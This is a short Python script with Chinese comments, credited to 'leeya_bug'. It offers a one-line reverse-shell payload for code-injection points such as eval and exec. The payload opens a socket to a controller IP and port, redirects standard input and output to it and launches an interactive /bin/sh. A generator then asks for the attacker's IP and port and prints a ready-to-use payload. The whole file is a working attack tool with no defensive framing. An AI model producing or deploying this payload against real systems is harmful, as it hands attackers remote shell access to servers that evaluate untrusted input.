#by leeya_bug

#原理: 使用setattr将变量注入socket.socket类中
#适用于eval、exec等函数

#Payload: 
if False:
    str(setattr(__import__('socket').socket,'BUILTIN_ATTR_UsY8gpvx',__import__('socket').socket(__import__('socket').AF_INET, __import__('socket').SOCK_STREAM)))+str(__import__('socket').socket.BUILTIN_ATTR_UsY8gpvx.connect(("192.168.31.228",6333)))+str(__import__('os').dup2(__import__('socket').socket.BUILTIN_ATTR_UsY8gpvx.fileno(),0))+str(__import__('os').dup2(__import__('socket').socket.BUILTIN_ATTR_UsY8gpvx.fileno(),1))+str(__import__('os').dup2(__import__('socket').socket.BUILTIN_ATTR_UsY8gpvx.fileno(),2))+str(__import__('subprocess').call(["/bin/sh","-i"]))

#Payload生成
IP = input('请输入控制端IP: ')
PORT = input('请输入控制端端口: ')
print(f'''str(setattr(__import__('socket').socket,'BUILTIN_ATTR_UsY8gpvx',__import__('socket').socket(__import__('socket').AF_INET, __import__('socket').SOCK_STREAM)))+str(__import__('socket').socket.BUILTIN_ATTR_UsY8gpvx.connect(("{IP}",{PORT})))+str(__import__('os').dup2(__import__('socket').socket.BUILTIN_ATTR_UsY8gpvx.fileno(),0))+str(__import__('os').dup2(__import__('socket').socket.BUILTIN_ATTR_UsY8gpvx.fileno(),1))+str(__import__('os').dup2(__import__('socket').socket.BUILTIN_ATTR_UsY8gpvx.fileno(),2))+str(__import__('subprocess').call(["/bin/sh","-i"]))''')
